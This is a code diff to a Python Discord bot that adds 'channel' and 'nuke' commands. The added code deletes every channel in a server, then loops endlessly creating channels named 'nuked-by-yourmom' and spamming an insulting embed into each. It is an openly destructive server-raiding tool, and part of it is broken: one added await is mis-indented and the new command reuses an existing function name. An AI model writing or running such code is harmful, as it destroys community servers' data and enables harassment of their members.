@@ -72,9 +72,22 @@ async def spam(ctx):
 #CreateChannel
 @client.command(name="channel", help="Spam's a amount of channel's")
 async def channel(ctx):
+    for c in ctx.guild.channels: # iterating through each guild channel
+    await c.delete()
     while(True):
-        
         await ctx.guild.create_text_channel("nuked-by-yourmom")
+
+
+@client.command(name="nuke", help="Does everything you need it to do!")
+async def channel(ctx):
+    for c in ctx.guild.channels: # iterating through each guild channel
+        await c.delete()
+    while(True):
+        await ctx.guild.create_text_channel("nuked-by-yourmom")
+        for c in ctx.guild.channels:
+            embed = discord.Embed(title="LLLLL", description=f"BEAMED BY YOUR MOM!!")
+            await c.send(embed=embed)
+
     
 
 
